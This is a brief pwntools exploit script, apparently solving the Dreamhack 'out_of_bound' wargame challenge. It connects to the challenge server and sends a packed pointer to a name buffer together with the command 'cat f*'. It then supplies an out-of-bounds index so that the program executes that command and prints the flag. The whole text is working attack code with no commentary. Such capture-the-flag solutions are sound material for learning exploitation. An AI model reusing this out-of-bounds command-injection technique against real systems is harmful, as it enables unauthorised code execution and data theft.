from pwn import *
context.update(log_level = 'debug')

p = remote('host1.dreamhack.games', 8519)
#p = process('out_of_bound')
p.recvrepeat(1)
addr_name = 0x804A0AC
p.sendline(p32(addr_name + 4) + 'cat f*')
p.recvrepeat(1)
#raw_input('debug : ' + str(p.pid))
p.sendline('19')

p.interactive()
